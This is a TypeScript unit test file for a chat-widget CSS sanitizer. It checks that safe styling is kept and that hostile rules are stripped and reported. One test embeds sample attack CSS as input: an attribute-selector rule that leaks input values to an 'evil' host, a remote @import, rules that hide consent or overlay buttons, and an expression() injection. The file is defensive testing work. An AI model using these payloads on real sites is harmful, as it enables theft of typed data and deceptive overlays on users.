import { sanitizeWidgetCss } from './css-sanitizer.util';

describe('sanitizeWidgetCss (PLN-260910 P5)', () => {
  it('keeps paint/typography rules on stable classes and normalizes them', () => {
    const r = sanitizeWidgetCss(`
      /* brand */
      .st-header { background-color: #111; color: rgb(255,255,255) }
      .st-message.st-message-user, .st-launcher:hover { border-radius: 20px; font-weight: 600; }
      .st-panel > .st-tabs .st-tab { padding: 8px 12px; box-shadow: 0 1px 2px rgba(0,0,0,.2) }
    `);
    expect(r.dropped).toEqual([]);
    expect(r.css).toBe(
      [
        '.st-header { background-color: #111; color: rgb(255,255,255); }',
        '.st-message.st-message-user, .st-launcher:hover { border-radius: 20px; font-weight: 600; }',
        '.st-panel > .st-tabs .st-tab { padding: 8px 12px; box-shadow: 0 1px 2px rgba(0,0,0,.2); }',
      ].join('\n'),
    );
  });

  it('drops exfiltration and redress vectors and reports each', () => {
    const r = sanitizeWidgetCss(`
      .st-input[value^="a"] { background: url(https://evil/?a) }
      @import url(https://evil/x.css);
      .st-consent { display: none }
      .st-send { position: fixed; opacity: 0; color: red }
      body { color: red }
      .st-header { background-image: url("x") }
      .st-header { color: expression(alert(1)) }
      .st-header { font-family: var(--evil) }
      @media (min-width: 1px) { .st-header { color: red } }
    `);
    expect(r.css).toBe('.st-send { color: red; }');
    expect(r.dropped).toEqual(
      expect.arrayContaining([
        expect.stringContaining('selector not allowed: ".st-input[value^="a"]"'),
        expect.stringContaining('property not allowed: display'),
        expect.stringContaining('property not allowed: position'),
        expect.stringContaining('property not allowed: opacity'),
        expect.stringContaining('selector not allowed: "body"'),
        expect.stringContaining('property not allowed: background-image'),
        expect.stringContaining('value not allowed for color'),
        expect.stringContaining('value not allowed for font-family'),
      ]),
    );
    // @import is swallowed into the preceding unterminated text, never emitted.
    expect(r.css).not.toMatch(/import|url\(|@/);
  });

  it('accepts the widget token variables only, and empty input is empty', () => {
    expect(sanitizeWidgetCss('.st-tab { color: var(--ivy-primary-700) }').css).toBe('.st-tab { color: var(--ivy-primary-700); }');
    expect(sanitizeWidgetCss('.st-tab { color: var( --x ) }').dropped[0]).toMatch(/value not allowed/);
    expect(sanitizeWidgetCss('')).toEqual({ css: '', dropped: [] });
    expect(sanitizeWidgetCss(null)).toEqual({ css: '', dropped: [] });
  });

  it('truncates an oversized stylesheet and says so', () => {
    const big = '.st-panel { color: red }\n'.repeat(3000);
    const r = sanitizeWidgetCss(big);
    expect(r.dropped[0]).toMatch(/exceeds 32KB/);
    expect(r.css.length).toBeGreaterThan(0);
  });
});
